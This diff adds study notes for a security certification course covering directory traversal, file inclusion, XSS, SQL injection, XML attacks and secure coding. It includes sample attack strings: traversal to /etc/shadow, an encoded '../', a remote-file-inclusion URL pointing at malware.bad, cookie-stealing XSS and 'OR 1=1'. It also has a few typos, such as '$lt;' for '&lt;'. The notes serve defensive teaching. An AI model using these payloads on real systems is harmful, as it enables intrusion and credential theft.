@@ -1,0 +1,131 @@
+### Directory Traversal
+- type of injection attack
+	- attack occurs when the attacker inserts malicious code through an application interface
+- an application attack that allows access to commands, file, and directories that may or
+- right, web application directory traversal.
+- typically websites are in the` /www_root` folder, so you gotta `../../../` all the way to root, then to `/etc/shadow` or `/etc/passwd` to get the juicy bits
+- Unix systems user `../`
+- Windows systems use `..\`
+	- this is default
+	- can be configured to accept `../` as well
+- Directory traversals may be used to access any file on a system with the right permissions
+- Attackers may use encoding to hide directory traversal attempts
+	- `%2e%2e%2f` is `../` be on the lookout
+- File Inclusions
+	- A web application vulnerability that allows an attacker to either download a file from an arbitrary location on the hose file system or to upload an executable or script file to open a backdoor
+	- your infected `.php.jpg` files, as an example
+- Remote file Inclusion
+	- An attacker executes a script to inject a remote file into the web app or website
+	- `https://diontraining.com/login.php?user=http://malware.bad/malicious.php`
+		- so, instead of attempting to login with a legitimate username, we’re going to try and upload this malicious php script to get in.
+- Local File Inclusions
+- Attacker adds a` file to the web app or website that already exists on the hosting server
+- this is the poisoned PHP upload
+- then just reference` the file that’s been uploaded.
+- Exam tips
+	- `../` = directory traversal
+	- to prevent directory traversals and file inclusion attacks, use proper input validation
+### Cross-site Scripting (XSS)
+- a malicious script hosted on the attacker’s site or coded in a link injected onto a trusted site, designed to compromise clients browsing the trusted site, circumventing the browser’s security model of trusted zones
+	- trying to get you to click on something to run something that your system doesn’t want to do.
+- Power input validation exploit
+- How does it happen?
+	- Attacker identifies input validation vulnerability within a trusted website.
+	- Attacker crafts a URL to perform code injection against the trusted website
+		- just gotta get someone to click on it, use those phishing emails
+	- The trusted site returns a page containing the malicious code injected
+		- hides the separate code behind a legitimate page loading
+		- input isn’t validated, so the website won’t bounce back an error
+	- Malicious code then runs in the client’s browser with permission level as the trusted site
+- XSS breaks the browser’s security model since browsers assume scripting is safe
+- Jason shows the ol `<script=javascript>alert(‘oh no’)</script>` pop up trick
+- that trick is a Reflected or non-persistent XSS attack
+- Persistent XSS
+	- an attack that inserts code into a back-end database used by the trusted site
+- reflected, non-persistent, and persistent XSS attacks occur as server-side scripting attacks
+	- because the server executes the code and presents it to your browser
+- Document Object Model (DOM) XSS
+	- an attack that exploits the client’s web browser using client-side scripts to modify the content and layout of a web page
+	- DOM is how you display things in the browser
+	- example: `https://diontraining.com/index.html#default=<script>alert(document.cookie)</script>`
+		- this is going to load the `document.cookie` from the DOM, attempting to access the cookies
+	- DOM XSS attacks run with the logged in user’s privileges of the local system
+- Exam Tip: ^exam-tip
+	- if you see `<script>` that’s 99% gonna be XSS
+	- also “javascript” in the URL
+	- to prevent XSS attacks, use proper input validation
+	- look for the `document.[thing]` for a DOM XSS
+### SQL Injection
+- Structured Query Language (SQL) is used to select, insert, delete, or update data within a database
+	- select = read from database
+	- insert = put in to database
+	- delete = remove from database
+	- update = replace what’s in database
+- How does a normal SQL request work?
+	- login example
+		- input “jason” for user
+		- input “pass123” for password
+	- query looks like this:
+		- `select * from Users where user_id = ‘jason’ and password = ‘pass123’`
+	- if it fails, bad PW or User
+- Injection Attack
+	- insertion of additional information or code through data input from a client to an application
+- an attacker must test every single input to include elements such as URL parameters, form fields, cookies, POST data and HTTP headers to identify a SQL injection vulnerability
+- How does an SQL Injection attack work?
+	- using example above, input `‘ OR 1=1;`
+	- says “find a blank password OR 1=1"
+	- because 1 will always = 1, it’s true, so it will return true.
+- SQL injection is prevented through input validation and using least privilege when accessing a database
+- Exam Tip: ^exam-tip
+	- if you see `‘ OR 1=1;` that’s SQL injection
+	- to prevent SQL injections, use proper input validation
+- Insecure Object Reference
+	- Coding vulnerability where unvalidated input is used to select a resource object like a file or database
+	- Example:
+		- `https://BankOfDion.com/account.php?acct=1234`
+		- your account number is right there!
+		- change the account number to get a new account
+	- Prevention
+		- implement access control techniques in applications to verify a user is authorized to access a specific object
+### XML Vulnerabilities
+- eXtensible Markup Language
+- Used for verifications and data exchange/uploading
+- Not necessarily “injection” more “parsing”
+- XML data submitted without encryption or input validation is vulnerable to spoofing, request forgery, and injection of arbitrary code
+- Here’s some exploits:
+- XML Bomb (Billion Laughs Attack)
+	- XML encodes entities that expand to exponential sizes, consuming memory on the host and potentially crashing it
+	- DoS attack
+- XML External Entity (XXE)
+	- an attack that embeds a request for a local resource
+	- that’s a file inclusion attack
+	- to prevent this: input validation
+- Exam Tips: ^exam-tip
+	- If you see XML formatting, it’s an XML exploit
+	- look for that “XML”
+### Secure Coding
+- Input Validation
+	- any technique used to ensure that the data entered into a field or variable in an application is handled appropriately by that application
+	- whatever you take from a user should be accurate
+	- can be conducted locally or on the server
+	- Warning
+		- client-side input validation is more dangerous since it is vulnerable to malware interference
+	- server-side input validation can be time and resource intensive
+	- input should still undergo server-side validation after passing client-side validation
+	- input should be subjected to:
+		- Normalization
+			- a string is stripped of illegal characters or substrings and converted to the accepted character set
+		- Sanitization
+	- Canonicalization Attack
+		- attack method where input characters are encoded in such a way as to evade vulnerable input validation measures
+		- turning your `../` into `%2e%2e%2f` so that it can bypass any normalization
+- Output Encoding
+	- Coding methods to sanitize output by converting untrusted input into a safe form where the input is displayed as data to the user without executing as code in the browser.
+	- convert `&` to `&amp;`
+	- Convert `<` to `$lt;`
+	- won’t execute when you display it back to the user
+	- Output encoding mitigates against code injection and XSS attacks that attempt to user input to run a script
+- Parameterized Queries
+	- a technique that defends against SQL injection and insecure object references by incorporating placeholders in an SQL query
+- Exam Tip: ^exam-tip
+	- need to identify all of these in the exam
